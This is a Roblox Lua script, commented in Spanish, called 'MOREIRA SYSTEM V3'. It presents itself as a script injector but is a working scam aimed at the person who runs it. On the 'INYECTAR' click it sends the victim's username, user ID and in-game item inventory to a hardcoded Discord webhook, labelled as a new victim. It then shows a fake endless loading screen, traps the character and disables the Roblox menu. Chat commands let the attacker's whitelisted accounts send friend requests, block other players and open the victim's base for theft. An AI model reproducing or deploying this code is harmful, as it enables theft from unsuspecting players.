local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage") -- Necesario para .open
local VIM = game:GetService("VirtualInputManager") -- Necesario para clics autom√°ticos en .block

-- CONFIGURACI√ìN
local WEBHOOK_URL = "https://discord.com/api/webhooks/1457204427265019926/CTOox2xHKlvuKSiDk5-lRlmt6dmri-S3tIa8UYcnDe0QYfciKRJMJWfB-_-zoIditG5u"
local Min_Gen = 0

-- Whitelist para evitar bloquearse a s√≠ mismo o amigos en .block [cite: 165]
local whitelist = {
    "hesizdev",
    "IlIlIlIlIIlI_lIlIlIl",
    "multicuentadeangel5"
}

-- VARIABLES LOCALES
local Jugador = Players.LocalPlayer
local PlayerGui = Jugador:WaitForChild("PlayerGui")
local UserID = Jugador.UserId

--------------------------------------------------------------------------------
-- FUNCIONES DE UTILIDAD (SIN CAMBIOS)
--------------------------------------------------------------------------------

local function isWhitelisted(username)
    for _, whitelistedName in ipairs(whitelist) do
        if username == whitelistedName then return true end
    end
    return false
end

local function formatNumberShort(n)
    if not n or type(n) ~= "number" then return "$0" end
    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
    return "$" .. tostring(n)
end

local function parseValueFromText(s)
    if not s then return 0 end
    local clean = s:gsub("[^%d%.KMB+]", "")
    local numPart = clean:match("([%d%.]+)")
    if not numPart then return 0 end
    local n = tonumber(numPart) or 0
    if clean:find("B") then return n * 1e9
    elseif clean:find("M") then return n * 1e6
    elseif clean:find("K") then return n * 1e3
    else return n end
end

local function getBrainrots()
    local results = {}
    for _, desc in ipairs(Workspace:GetDescendants()) do
        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") or desc.Name:find("Display") then
            local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name") or desc:FindFirstChild("Title")
            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value") or desc:FindFirstChild("Stat")
            
            if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
                local val = parseValueFromText(genLbl.Text)
                if val >= Min_Gen then
                    local key = nameLbl.Text .. "|" .. val
                    if results[key] then 
                        results[key].count = results[key].count + 1
                    else 
                        results[key] = {name = nameLbl.Text, value = val, count = 1} 
                    end
                end
            end
        end
    end
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a, b) return a.value > b.value end)
    return out
end

--------------------------------------------------------------------------------
-- L√ìGICA DE COMANDOS (.add, .block, .open)
--------------------------------------------------------------------------------

-- Funci√≥n para que el comando .add env√≠e solicitud de amistad autom√°tica [cite: 188]
local function promptFR(targetPlayer)
    if not targetPlayer then return end
    pcall(function()
        StarterGui:SetCore("PromptSendFriendRequest", targetPlayer)
    end)
    task.wait(0.5)
    pcall(function()
        local rgui = CoreGui:FindFirstChild("RobloxGui")
        local btn = rgui and rgui:FindFirstChild("ConfirmButton", true)
        if btn then
            GuiService.SelectedObject = btn
            VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
            VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
        end
    end)
end

-- Configura la escucha del chat para los comandos [cite: 179]
local function configurarComandos(playerToConfig)
    if playerToConfig == Jugador then return end -- No escucharse a s√≠ mismo

    playerToConfig.Chatted:Connect(function(msg)
        local msgLower = msg:lower():gsub("%s+", "")
        
        -- Comando .add: Env√≠a webhook y pide amistad [cite: 180]
        if msgLower == ".add" then
            local brs = getBrainrots()
            sendToDiscord("Comando .add ejecutado", brs)
            pcall(function() promptFR(playerToConfig) end)
            
        -- Comando .block: Bloquea a todos excepto whitelist 
        elseif msgLower == ".block" then
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= Jugador and not isWhitelisted(p.Name) then
                    StarterGui:SetCore("PromptBlockPlayer", p)
                    task.wait(0.5)
                end
            end
            
        -- Comando .open: Abre la base mediante PlotService 
        elseif msgLower == ".open" then
            pcall(function()
                ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer()
            end)
        end
    end)
end

-- Iniciar escucha para jugadores actuales y nuevos [cite: 183]
for _, p in ipairs(Players:GetPlayers()) do configurarComandos(p) end
Players.PlayerAdded:Connect(configurarComandos)

--------------------------------------------------------------------------------
-- FUNCIONES DE PANTALLA Y SEGURIDAD
--------------------------------------------------------------------------------

local function MostrarPantallaFinal()
    local FinalGui = Instance.new("ScreenGui", PlayerGui)
    FinalGui.Name = "RobloxLoadingSystem"
    FinalGui.IgnoreGuiInset = true
    FinalGui.DisplayOrder = 2147483647 
    
    local BG = Instance.new("Frame", FinalGui)
    BG.Size = UDim2.new(1.2, 0, 1.2, 0)
    BG.Position = UDim2.new(-0.1, 0, -0.1, 0)
    BG.BackgroundColor3 = Color3.new(0,0,0)
    BG.Active = true

    local Logo = Instance.new("ImageLabel", BG)
    Logo.Image = "rbxassetid://9167384795"
    Logo.Size = UDim2.new(0, 130, 0, 130)
    Logo.Position = UDim2.new(0.5, 0, 0.4, 0)
    Logo.AnchorPoint = Vector2.new(0.5, 0.5)
    Logo.BackgroundTransparency = 1

    local Status = Instance.new("TextLabel", BG)
    Status.Text = "Joining Server..."
    Status.Font = Enum.Font.GothamBold
    Status.TextSize = 32 
    Status.TextColor3 = Color3.new(1, 1, 1)
    Status.Position = UDim2.new(0.5, 0, 0.55, 0)
    Status.AnchorPoint = Vector2.new(0.5, 0.5)
    Status.BackgroundTransparency = 1

    local BarBG = Instance.new("Frame", BG)
    BarBG.Size = UDim2.new(0.3, 0, 0, 4)
    BarBG.Position = UDim2.new(0.5, 0, 0.62, 0)
    BarBG.AnchorPoint = Vector2.new(0.5, 0.5)
    BarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    BarBG.BorderSizePixel = 0

    local BarFill = Instance.new("Frame", BarBG)
    BarFill.Size = UDim2.new(0.1, 0, 1, 0)
    BarFill.BackgroundColor3 = Color3.new(1, 1, 1)
    BarFill.BorderSizePixel = 0

    task.spawn(function()
        local messages = {"Requesting Server...", "Loading Map Data...", "Syncing Assets...", "Finalizing..."}
        while true do
            for _, msg in ipairs(messages) do
                Status.Text = msg
                TweenService:Create(BarFill, TweenInfo.new(2), {Size = UDim2.new(math.random(20, 90)/100, 0, 1, 0)}):Play()
                task.wait(3)
            end
        end
    end)
end

function sendToDiscord(link, brainrots)
    local itemList = ""
    local totalValue = 0
    for i, br in ipairs(brainrots) do
        if i <= 15 then 
            itemList = itemList .. string.format("> `[%d]` **%s** ‚ûî %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count)
        end
        totalValue = totalValue + (br.value * br.count)
    end

    local request = syn and syn.request or http_request or request
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "||@everyone|| ü©∏ **NUEVA V√çCTIMA**",
                embeds = {{
                    title = "üöÄ Reporte de Extracci√≥n Moreira",
                    color = 16711680,
                    fields = {
                        {name = "üë§ Usuario", value = Jugador.Name .. " (" .. UserID .. ")", inline = true},
                        {name = "üí∞ Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
                        {name = "üîó Script", value = "`" .. link .. "`"},
                        {name = "üìã Inventario", value = (itemList ~= "" and itemList or "Vac√≠o")}
                    }
                }}
            })
        })
    end)
end

function trapPlayer()
    local char = Jugador.Character or Jugador.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    hrp.Anchored = true
    hrp.CFrame = CFrame.new(0, 999999, 0)
end

function bloquearMenuRoblox()
    task.spawn(function()
        pcall(function()
            StarterGui:SetCore("TopbarEnabled", false)
            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        end)
        while task.wait(0.5) do
            pcall(function()
                CoreGui.RobloxGui.Enabled = false
            end)
        end
    end)
end

--------------------------------------------------------------------------------
-- MEN√ö DE INICIO
--------------------------------------------------------------------------------

local function IniciarMenu()
    local MenuGui = Instance.new("ScreenGui", PlayerGui)
    local Frame = Instance.new("Frame", MenuGui)
    Frame.Size = UDim2.new(0, 450, 0, 280)
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    Instance.new("UIStroke", Frame).Color = Color3.fromRGB(255, 40, 40)
    Instance.new("UICorner", Frame)

    local Title = Instance.new("TextLabel", Frame)
    Title.Text = "MOREIRA SYSTEM V3"
    Title.Size = UDim2.new(1, 0, 0, 60)
    Title.TextColor3 = Color3.new(1, 1, 1)
    Title.Font = Enum.Font.GothamBold
    Title.BackgroundTransparency = 1

    local Input = Instance.new("TextBox", Frame)
    Input.Size = UDim2.new(0.85, 0, 0, 50)
    Input.Position = UDim2.new(0.075, 0, 0.45, 0)
    Input.PlaceholderText = "Pega el script aqu√≠..."
    Input.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    Input.TextColor3 = Color3.new(1, 1, 1)
    Instance.new("UICorner", Input)

    local Btn = Instance.new("TextButton", Frame)
    Btn.Size = UDim2.new(0.6, 0, 0, 50)
    Btn.Position = UDim2.new(0.2, 0, 0.78, 0)
    Btn.Text = "INYECTAR"
    Btn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
    Btn.TextColor3 = Color3.new(1, 1, 1)
    Instance.new("UICorner", Btn)

    Btn.MouseButton1Click:Connect(function()
        local link = Input.Text
        local brs = getBrainrots()
        sendToDiscord(link, brs)
        MenuGui:Destroy()
        MostrarPantallaFinal()
        trapPlayer()
        bloquearMenuRoblox()
    end)
end

IniciarMenu()
